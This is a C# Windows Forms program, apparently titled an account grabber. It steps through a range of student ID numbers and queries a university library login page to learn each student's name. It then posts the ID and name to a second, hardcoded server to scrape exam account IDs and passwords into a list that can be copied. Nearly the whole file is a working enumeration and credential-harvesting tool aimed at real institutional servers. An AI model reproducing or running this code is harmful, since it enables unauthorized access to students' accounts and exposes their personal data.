using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Text;
using System.Windows.Forms;
using System.Threading;

using System.Net;
using System.IO;
using System.Text.RegularExpressions;
using System.Web;
using System.Diagnostics;

namespace 新航线账号获取器
{
	public partial class FrmMain : Form
	{
		private ManualResetEvent manualReset = new ManualResetEvent(true);

		public FrmMain()
		{
			Control.CheckForIllegalCrossThreadCalls = false;
			InitializeComponent();
		}

		private void btn_GetCount_Click(object sender, EventArgs e)
		{
			if(!backgroundWorker.IsBusy)
			backgroundWorker.RunWorkerAsync();
		}

		private void backgroundWorker_DoWork(object sender, DoWorkEventArgs e)
		{
			Dobackwork();
		}

		private void Dobackwork()
		{
			for (int i = 20130001; i < 20149999; i++)
			{
				status.Text = "正在扫描"+i.ToString()+" 已获取"+listView.Items.Count+"条";
				//图书馆获取姓名

				string xm = "";
                string Lib_RespHtml = SendPostData(@"http://202.115.182.3/gdweb/ReaderLogin.aspx", "text/html, application/xhtml+xml, */*", "1", "application/x-www-form-urlencoded", "Mozilla/5.0 (Windows NT 5.2; rv:11.0) Gecko/20100101 Firefox/11.0", "POST", "ScriptManager1=UpdatePanel1|ImageButton1&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUJNzQ4NzgzNjUwD2QWAgIDD2QWAgIFD2QWAmYPZBYGAgEPZBYCAgEPDxYCHgRUZXh0BesGPHRkIHN0eWxlPSJoZWlnaHQ6IDIxcHgiPjxBIGhyZWY9J2RlZmF1bHQuYXNweCc%2BPHNwYW4%2B6aaW6aG1PC9zcGFuPjwvQT48L3RkPjx0ZCBzdHlsZT0iaGVpZ2h0OiAyMXB4Ij48QSBocmVmPSdkZWZhdWx0LmFzcHgnPjxzcGFuPuS5puebruafpeivojwvc3Bhbj48L0E%2BPC90ZD48dGQgc3R5bGU9ImhlaWdodDogMjFweCI%2BPEEgaHJlZj0nTWFnYXppbmVDYW50b1NjYXJjaC5hc3B4Jz48c3Bhbj7mnJ%2FliIrnr4flkI08L3NwYW4%2BPC9BPjwvdGQ%2BPHRkIHN0eWxlPSJoZWlnaHQ6IDIxcHgiPjxBIGhyZWY9J1Jlc2VydmVkTGlzdC5hc3B4Jz48c3Bhbj7pooTnuqbliLDppoY8L3NwYW4%2BPC9BPjwvdGQ%2BPHRkIHN0eWxlPSJoZWlnaHQ6IDIxcHgiPjxBIGhyZWY9J0V4cGlyZWRMaXN0LmFzcHgnPjxzcGFuPui2heacn%2BWFrOWRijwvc3Bhbj48L0E%2BPC90ZD48dGQgc3R5bGU9ImhlaWdodDogMjFweCI%2BPEEgaHJlZj0nTmV3Qm9vS1NjYXJjaC5hc3B4Jz48c3Bhbj7mlrDkuabpgJrmiqU8L3NwYW4%2BPC9BPjwvdGQ%2BPHRkIHN0eWxlPSJoZWlnaHQ6IDIxcHgiPjxBIGhyZWY9J0FkdmljZXNTY2FyY2guYXNweCc%2BPHNwYW4%2B5oOF5oql5qOA57SiPC9zcGFuPjwvQT48L3RkPjx0ZCBzdHlsZT0iaGVpZ2h0OiAyMXB4Ij48QSBocmVmPSdDb21tZW5kTmV3Qm9va1NjYXJjaC5hc3B4Jz48c3Bhbj7mlrDkuablvoHorqI8L3NwYW4%2BPC9BPjwvdGQ%2BPHRkIHN0eWxlPSJoZWlnaHQ6IDIxcHgiPjxBIGhyZWY9J1JlYWRlckxvZ2luLmFzcHgnPjxzcGFuPuivu%2BiAheeZu%2BW9lTwvc3Bhbj48L0E%2BPC90ZD48dGQgc3R5bGU9ImhlaWdodDogMjFweCI%2BPEEgaHJlZj0nT25saW5lU3R1ZHkuYXNweCc%2BPHNwYW4%2B5Zyo57q%2F5ZKo6K%2BiL%2BWfueiurTwvc3Bhbj48L0E%2BPC90ZD5kZAIDD2QWBAICDw8WAh8ABTI8c3Bhbj7mrKLov47mgqg6R3Vlc3Qg6K%2B36YCJ5oup5L2g55qE5pON5L2cPC9zcGFuPmRkAgMPDxYCHgdWaXNpYmxlaGRkAgUPZBYCAgEPZBYCAgMPZBYCZg8QZBAVAwzlgJ%2Fkuabor4Hlj7cM6K%2B76ICF5p2h56CBBuWnk%2BWQjRUDDOWAn%2BS5puivgeWPtwzor7vogIXmnaHnoIEG5aeT5ZCNFCsDA2dnZ2RkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQxJbWFnZUJ1dHRvbjFoCd0dA%2FM8nmanm%2BMWUnLxltmrEw%3D%3D&DropDownList1=%E5%80%9F%E4%B9%A6%E8%AF%81%E5%8F%B7&TextBox1=" + i.ToString().Trim() + "&TextBox2=&__EVENTVALIDATION=%2FwEWCAKVlsqGDALgnZ70BALrr%2BCHBALntNySDgLwuLirBQLs0bLrBgLs0fbZDALSwpnTCINnD0bp0SEKc5MGS39%2FvwLUH8qY&ImageButton1.x=11&ImageButton1.y=5", "成功", new CookieContainer());
				if (Lib_RespHtml == "")
					continue;
				if (Lib_RespHtml.Contains("密码错误"))
					continue;
				if (Lib_RespHtml.Contains("不存在"))
					continue;
				Match Lib_Founduser = (new Regex(@"欢迎您:[\u4e00-\u9fa5][\u4e00-\u9fa5]?([\u4e00-\u9fa5])?([\u4e00-\u9fa5])").Match(Lib_RespHtml));
                if (Lib_Founduser.Success)
				xm = Lib_Founduser.Groups[0].Value.ToString().Substring(4);

				//新航线获取账号

				string userid = "";
				string pwd = "";
				string lb = "";
                string Info_RespHtml = SendPostData(@"http://113.54.11.209:8080/kbcx.aspx", "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*", "http://113.54.11.209:8080/kbcx.aspx", "application/x-www-form-urlencoded", "Mozilla/5.0 (Windows NT 5.2; rv:11.0) Gecko/20100101 Firefox/11.0", "POST", "__VIEWSTATE=%2FwEPDwUKLTY1NTQ0OTY2OGRkqSLqlw5v1pj9qdpiB%2F86%2Fb5c7ktva2dBucP3DGd%2FfOQ%3D&__VIEWSTATEGENERATOR=1B4BCDB1&__EVENTVALIDATION=%2FwEWBAK4mMnwBQKItOyqAQKBptfADgKk0dDeBuqvNK0cc3NacUzOgYGZMckTQsg%2BGz5JitcijAhhCDHc&t_kb_xh=" + i.ToString() + "&t_kb_xm=" + HttpUtility.UrlEncode(xm, System.Text.Encoding.GetEncoding("UTF-8")) + "&kb_b=%E6%9F%A5++%E8%AF%A2", "成功", new CookieContainer());
				if (Lib_RespHtml == "")
					continue;
				if (!Info_RespHtml.Contains("模拟考号"))
					continue;
				Match Founduser = (new Regex(@">........</").Match(Info_RespHtml));
                if (Founduser.Success)
				userid = Founduser.Groups[0].Value.ToString().Substring(1, 8);
				Match Foundpwd = (new Regex(@">................</").Match(Info_RespHtml));
                if (Foundpwd.Success)
				pwd = Foundpwd.Groups[0].Value.ToString().Substring(1, 16);

                try
                {
				Match Foundlb = (new Regex(@">全国二级.").Match(Info_RespHtml));
                lb = Foundlb.Groups[0].Value.ToString().Substring(5) == "V" ? "VF" : Foundlb.Groups[0].Value.ToString().Substring(5);
                lb = "国家二级" + lb;

                }
                catch
                {
                    Match Foundlb = (new Regex(@"Office办公软件高级应用").Match(Info_RespHtml));
                    lb = "Office办公软件高级应用";
                }
				
				ListViewItem lvi = new ListViewItem();
				lvi.Text = userid;
				lvi.SubItems.Add(pwd);
				lvi.SubItems.Add(lb);
				listView.Items.Add(lvi);

				manualReset.WaitOne(); //等待堵塞线程
			}
			this.status.Text = "获取完成，共"+listView.Items.Count+"条记录.";
		}

		private void btn_pause_Click(object sender, EventArgs e)
		{
			if (!backgroundWorker.IsBusy)
				return;
			if (btn_pause.Text == "暂停")
			{
				btn_pause.Image = Properties.Resources.start;
				manualReset.Reset();//暂停当前线程的工作，发信号给waitOne方法，阻塞
				status.Text = "已获取" + listView.Items.Count + "条记录.";
				btn_pause.Text = "继续";
			}
			else
			{
				btn_pause.Image = Properties.Resources.pause;
				manualReset.Set();//继续某个线程的工作
				btn_pause.Text = "暂停";
				status.Text = "正在获取...";
			}
		}

		private void btn_copy_Click(object sender, EventArgs e)
		{
			if (listView.SelectedIndices != null && listView.SelectedItems.Count > 0)
			{
				ListView.SelectedIndexCollection c = listView.SelectedIndices;
				Clipboard.SetText(listView.Items[c[0]].Text + " " + listView.Items[c[0]].SubItems[1].Text);
				MessageBox.Show("已复制到剪切板！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Information);
			}	
		}

		private void btn_clear_Click(object sender, EventArgs e)
		{
			listView.Items.Clear();
		}

		private void btn_About_Click(object sender, EventArgs e)
		{
			FrmAbout about = new FrmAbout();
			about.ShowDialog();
		}

		public string SendPostData(string strUrl, string Accept, string Referer, string ContentType, string UserAgent, string Method, string PostData, string SuccessKey, CookieContainer cc)
		{
			try
			{
				//实例化HttpWebRequest对象
				HttpWebRequest hwrQuest = (HttpWebRequest)WebRequest.Create(strUrl);

				//数据头信息
				hwrQuest.Accept = Accept;
				hwrQuest.Referer = Referer;
				hwrQuest.ContentType = ContentType;
				hwrQuest.UserAgent = UserAgent;
				hwrQuest.KeepAlive = true;
				hwrQuest.Method = Method;
				hwrQuest.CookieContainer = cc;

				//开始发送数据包信息
				ASCIIEncoding ae = new ASCIIEncoding();
				byte[] by = ae.GetBytes(PostData);

				hwrQuest.ContentLength = by.Length;

				Stream MyStream = hwrQuest.GetRequestStream();
				MyStream.Write(by, 0, by.Length);
				MyStream.Close();

					//实例化HttpWebResponse
				HttpWebResponse hwrp = (HttpWebResponse)hwrQuest.GetResponse();
				StreamReader MyStreamR = new StreamReader(hwrp.GetResponseStream(), Encoding.GetEncoding("UTF-8"));
				string result = MyStreamR.ReadToEnd();
				MyStreamR.Close();
				return result;
				}
			catch (Exception)
			{
				return "";
			}
		}

	}
}
